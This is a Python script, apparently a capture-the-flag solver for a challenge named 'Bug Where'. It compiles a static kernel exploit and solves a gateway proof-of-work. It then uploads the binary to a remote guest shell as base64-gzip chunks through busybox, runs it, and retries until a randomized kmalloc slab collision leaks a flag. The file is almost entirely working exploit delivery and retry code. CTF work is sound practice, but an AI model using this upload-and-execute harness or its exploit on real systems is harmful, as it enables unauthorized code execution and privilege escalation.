#!/usr/bin/env python3
"""Build/upload the Bug Where guest exploit and retry fresh VMs."""

from __future__ import annotations

import argparse
import base64
import gzip
import json
from pathlib import Path
import re
import socket
import subprocess
import sys
import time


ROOT = Path(__file__).resolve().parent
FLAG_RE = re.compile(rb"BHFlagY\{[^}\r\n]+\}")
FAIL_MARKER = b"pipe callback did not run"
SHELL_PROMPTS = (b"~ $", b"~ #", b"/ $")
GATEWAY_TARGET_RE = re.compile(rb"(?m)^([0-9a-f]{16})\r?$")
GATEWAY_QUERY_RE = re.compile(rb"keys\[(\d+)\]> $")


def build(binary: Path) -> None:
    command = [
        "gcc",
        "-static",
        "-O2",
        "-Wall",
        "-Wextra",
        "-fno-stack-protector",
        "-no-pie",
        "-o",
        str(binary),
        str(ROOT / "output" / "support" / "exploit.c"),
    ]
    subprocess.run(command, check=True)


def receive_until(sock: socket.socket, needles: tuple[bytes, ...], timeout: float) -> bytes:
    end = time.monotonic() + timeout
    data = bytearray()
    while time.monotonic() < end:
        sock.settimeout(max(0.1, end - time.monotonic()))
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        data.extend(chunk)
        if any(needle in data for needle in needles):
            break
    return bytes(data)


def connect_any(host: str, port: int, timeout: float) -> socket.socket:
    errors: list[OSError] = []
    addresses = socket.getaddrinfo(host, port, type=socket.SOCK_STREAM)
    for family, socktype, protocol, _, address in addresses:
        sock = socket.socket(family, socktype, protocol)
        sock.settimeout(min(timeout, 4.0))
        try:
            sock.connect(address)
            return sock
        except OSError as error:
            errors.append(error)
            sock.close()
    if errors:
        raise errors[-1]
    raise OSError(f"no addresses resolved for {host}")


def solve_gateway_pow(target: bytes) -> bytes:
    solver = ROOT / "output" / "support" / "gpu_pow.py"
    completed = subprocess.run(
        [sys.executable, str(solver), target.decode("ascii")],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    fields = completed.stdout.split()
    if not fields or not re.fullmatch(rb"[0-9a-f]{8}", fields[0]):
        raise RuntimeError("GPU PoW solver returned an invalid answer")
    return fields[0]


def pass_gateway(sock: socket.socket, initial: bytes, timeout: float) -> bytes:
    transcript = bytearray(initial)
    if any(prompt in initial for prompt in SHELL_PROMPTS):
        return bytes(transcript)
    if not initial.endswith(b"> "):
        return bytes(transcript)

    sock.sendall(b"1\n")
    response = receive_until(sock, (b"]> ",) + SHELL_PROMPTS, timeout)
    transcript.extend(response)
    targets = GATEWAY_TARGET_RE.findall(response)
    if not targets:
        raise RuntimeError("gateway did not provide a PoW target")
    answers = [solve_gateway_pow(target) for target in targets]

    while not any(prompt in response for prompt in SHELL_PROMPTS):
        query = GATEWAY_QUERY_RE.search(response)
        if query is None:
            raise RuntimeError("gateway stopped before the guest shell")
        index = int(query.group(1))
        if index >= len(answers):
            raise RuntimeError(f"gateway requested unknown key index {index}")
        sock.sendall(answers[index] + b"\n")
        response = receive_until(sock, (b"]> ",) + SHELL_PROMPTS, timeout)
        transcript.extend(response)
        if b"AssertionError" in response:
            raise RuntimeError("gateway rejected the PoW answer")
    return bytes(transcript)


def remote_attempt(host: str, port: int, payload: bytes, timeout: float) -> tuple[bytes, bytes | None]:
    encoded = base64.b64encode(gzip.compress(payload, compresslevel=9))
    with connect_any(host, port, timeout) as sock:
        initial = receive_until(sock, (b"> ",) + SHELL_PROMPTS, timeout)
        banner = pass_gateway(sock, initial, timeout)
        sock.sendall(b"/bin/busybox stty -echo\n")
        banner += receive_until(sock, SHELL_PROMPTS, min(timeout, 5.0))
        sock.sendall(b"/bin/busybox base64 -d >/tmp/bugwhere.gz\n")
        for offset in range(0, len(encoded), 512):
            sock.sendall(encoded[offset : offset + 512] + b"\n")
        sock.sendall(b"\x04")
        banner += receive_until(sock, SHELL_PROMPTS, timeout)
        sock.sendall(
            b"/bin/busybox gzip -dc /tmp/bugwhere.gz >/tmp/bugwhere\n"
            b"/bin/busybox chmod 755 /tmp/bugwhere\n"
            b"/tmp/bugwhere\n"
        )
        output = banner + receive_until(sock, (b"BHFlagY{", FAIL_MARKER), timeout)
        match = FLAG_RE.search(output)
        if match is None and b"BHFlagY{" in output:
            output += receive_until(sock, (b"}" , FAIL_MARKER), 2.0)
            match = FLAG_RE.search(output)
        return output, match.group(0) if match else None


def parse_args() -> argparse.Namespace:
    instance = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in instance["endpoints"] if item["name"] == "main")
    parser = argparse.ArgumentParser(
        description="Upload the Bug Where exploit and retry for the randomized slab collision."
    )
    parser.add_argument("host", nargs="?", default=endpoint["host"], help="challenge hostname")
    parser.add_argument("port", nargs="?", type=int, default=endpoint["port"], help="challenge TCP port")
    parser.add_argument("--attempts", type=int, default=64)
    parser.add_argument("--timeout", type=float, default=20.0)
    parser.add_argument("--retry-delay", type=float, default=2.0)
    parser.add_argument("--binary", type=Path, default=ROOT / "output" / "support" / "exploit")
    parser.add_argument("--build", action="store_true", help="rebuild the static guest binary")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if not args.host or args.port is None:
        raise SystemExit("HOST and PORT are required")
    if args.attempts < 1:
        raise SystemExit("--attempts must be positive")
    if args.retry_delay < 0:
        raise SystemExit("--retry-delay cannot be negative")
    if args.build:
        build(args.binary)
    try:
        payload = args.binary.read_bytes()
    except OSError as error:
        raise SystemExit(f"cannot read guest binary {args.binary}: {error}") from error

    for attempt in range(1, args.attempts + 1):
        try:
            output, flag = remote_attempt(args.host, args.port, payload, args.timeout)
        except (OSError, TimeoutError) as error:
            last_error = error
            if attempt < args.attempts:
                time.sleep(args.retry_delay)
            continue
        if flag:
            sys.stdout.buffer.write(flag)
            return 0
        last_error = RuntimeError("randomized kmalloc partitions did not collide")
        if attempt < args.attempts:
            time.sleep(args.retry_delay)
    print(f"error: no collision after retries: {last_error}", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
